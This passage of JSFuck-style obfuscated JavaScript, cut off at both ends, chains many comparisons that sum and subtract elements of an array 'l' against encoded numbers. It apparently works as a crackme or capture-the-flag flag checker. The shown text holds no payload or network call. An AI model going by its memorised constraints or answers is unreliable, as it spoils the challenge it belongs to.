+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]+l[+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+[]]+l[!+[]+!+[]+!+[]+[+!+[]]]==+(+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+[]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]==+(+!+[]+[+[]+[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])&amp;&amp;l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]+l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]==+(!+[]+!+[]+!+[]+[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]]+l[!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]+l[+!+[]+[+[]]]==-+(+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]+l[+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]==+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[])&amp;&amp;l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+[]]-l[!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]]==-+(!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(!+[]+!+[]+[+!+[]+[!+[]+!+[]+!+[]]])&amp;&amp;l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+[]]+l[!+[]+!+[]+!+[]]==-+(!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]==-+(!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]-l[+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]]+l[+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]==+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])&amp;&amp;l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]+l[+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+